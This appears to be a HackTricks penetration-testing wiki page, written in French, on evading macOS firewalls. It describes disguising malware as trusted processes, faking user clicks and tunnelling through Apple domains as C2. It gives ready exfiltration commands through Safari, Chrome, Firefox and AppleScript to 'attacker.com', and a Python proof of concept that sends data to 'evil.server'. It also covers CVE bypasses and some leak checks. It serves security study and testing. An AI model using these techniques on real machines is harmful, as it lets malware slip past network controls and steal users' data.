# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Techniques trouvées

Les techniques suivantes ont été trouvées fonctionnant dans certaines applications de pare-feu macOS.

### Abus des noms de liste blanche

- Par exemple, appeler le malware avec des noms de processus macOS bien connus comme **`launchd`**

### Clic synthétique

- Si le pare-feu demande la permission à l'utilisateur, faire en sorte que le malware **clique sur autoriser**

### **Utiliser des binaires signés par Apple**

- Comme **`curl`**, mais aussi d'autres comme **`whois`**

### Domaines Apple bien connus

Le pare-feu pourrait autoriser les connexions vers des domaines Apple bien connus tels que **`apple.com`** ou **`icloud.com`**. Et iCloud pourrait être utilisé comme un C2.

### Contournement générique

Quelques idées pour essayer de contourner les pare-feu

### Vérifier le trafic autorisé

Connaître le trafic autorisé vous aidera à identifier les domaines potentiellement sur liste blanche ou quelles applications sont autorisées à y accéder.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abus de DNS

Les résolutions DNS sont effectuées via l'application signée **`mdnsreponder`** qui sera probablement autorisée à contacter les serveurs DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via les applications de navigateur

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via injections de processus

Si vous pouvez **injecter du code dans un processus** qui est autorisé à se connecter à n'importe quel serveur, vous pourriez contourner les protections du pare-feu :

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnérabilités récentes de contournement du pare-feu macOS (2023-2025)

### Contournement du filtre de contenu Web (Temps d'écran) – **CVE-2024-44206**
En juillet 2024, Apple a corrigé un bug critique dans Safari/WebKit qui a rompu le “filtre de contenu Web” à l'échelle du système utilisé par les contrôles parentaux de Temps d'écran. 
Une URI spécialement conçue (par exemple, avec un double encodage URL “://”) n'est pas reconnue par l'ACL de Temps d'écran mais est acceptée par WebKit, donc la requête est envoyée sans filtre. Tout processus capable d'ouvrir une URL (y compris le code sandboxé ou non signé) peut donc atteindre des domaines qui sont explicitement bloqués par l'utilisateur ou un profil MDM.

Test pratique (système non corrigé) :
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug d'ordre des règles du filtre de paquets (PF) dans les premières versions de macOS 14 “Sonoma”
Pendant le cycle bêta de macOS 14, Apple a introduit une régression dans l'enveloppe utilisateur autour de **`pfctl`**.  
Les règles ajoutées avec le mot-clé `quick` (utilisé par de nombreux kill-switches VPN) étaient silencieusement ignorées, provoquant des fuites de trafic même lorsqu'une interface graphique VPN/firewall rapportait *bloqué*. Le bug a été confirmé par plusieurs fournisseurs de VPN et corrigé dans RC 2 (build 23A344).

Vérification rapide des fuites :
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abus des services d'assistance signés par Apple (héritage – avant macOS 11.2)
Avant macOS 11.2, la **`ContentFilterExclusionList`** permettait à ~50 binaires Apple tels que **`nsurlsessiond`** et l'App Store de contourner tous les pare-feu à filtre de socket mis en œuvre avec le cadre Network Extension (LuLu, Little Snitch, etc.).
Les logiciels malveillants pouvaient simplement créer un processus exclu—ou y injecter du code—et faire passer leur propre trafic sur le socket déjà autorisé. Apple a complètement supprimé la liste d'exclusion dans macOS 11.2, mais la technique est toujours pertinente sur les systèmes qui ne peuvent pas être mis à jour.

Exemple de preuve de concept (avant 11.2) :
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Conseils d'outillage pour macOS moderne

1. Inspecter les règles PF actuelles générées par les pare-feu GUI :
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Énumérer les binaires qui détiennent déjà le droit *outgoing-network* (utile pour le piggy-backing) :
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Enregistrer programmétiquement votre propre filtre de contenu d'extension réseau en Objective-C/Swift.
Un PoC minimal sans racine qui redirige les paquets vers un socket local est disponible dans le code source de **LuLu** de Patrick Wardle.

## Références

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
